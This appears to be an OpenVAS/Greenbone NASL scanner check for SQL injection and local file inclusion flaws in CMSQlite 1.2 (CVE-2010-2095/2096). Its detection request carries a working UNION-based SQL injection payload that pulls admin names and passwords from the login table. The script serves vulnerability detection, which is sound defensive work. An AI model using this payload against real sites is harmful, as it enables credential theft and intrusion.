if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800789" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2010-06-09 08:34:53 +0200 (Wed, 09 Jun 2010)" );
	script_cve_id( "CVE-2010-2095", "CVE-2010-2096" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "CMSQlite 'index.php' SQL Injection and Directory Traversal Vulnerabilities" );
	script_xref( name: "URL", value: "http://php-security.org/2010/05/15/mops-2010-029-cmsqlite-c-parameter-sql-injection-vulnerability/index.html" );
	script_xref( name: "URL", value: "http://php-security.org/2010/05/15/mops-2010-030-cmsqlite-mod-parameter-local-file-inclusion-vulnerability/index.html" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "insight", value: "The flaws are due to:

  - Improper validation of user supplied input to 'c' parameter in 'index.php',
  allows attackers to execute SQL commands.

  - Improper validation of user supplied input to 'mod' parameter in 'index.php',
  allows attackers to include and execute local files." );
	script_tag( name: "solution", value: "Upgrade to CMSQlite 1.3 later." );
	script_tag( name: "summary", value: "This host is running CMSQlite and is prone to multiple SQL
  injection and directory traversal vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute SQL
  commands and arbitrary local files." );
	script_tag( name: "affected", value: "CMSQlite version 1.2 and prior." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.cmsqlite.net/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
cmsPort = http_get_port( default: 80 );
if(!http_can_host_php( port: cmsPort )){
	exit( 0 );
}
for path in nasl_make_list_unique( "/", "/cmsqlite", "/cmsqlite10", http_cgi_dirs( port: cmsPort ) ) {
	if(path == "/"){
		path = "";
	}
	rcvRes = http_get_cache( item: NASLString( path, "/index.php" ), port: cmsPort );
	if(ContainsString( rcvRes, ">CMSQlite<" )){
		sndReq = http_get( item: NASLString( path, "/index.php?c=2-2%20UNION%20ALL%20" + "SELECT%202,name%20||%20password,%203,4,5,6%20FR" + "OM%20login%20limit%201%20--%20x" ), port: cmsPort );
		rcvRes = http_keepalive_send_recv( port: cmsPort, data: sndReq );
		if(!isnull( rcvRes ) && eregmatch( pattern: ">admin.*</", string: rcvRes )){
			security_message( port: cmsPort );
			exit( 0 );
		}
	}
}
exit( 99 );

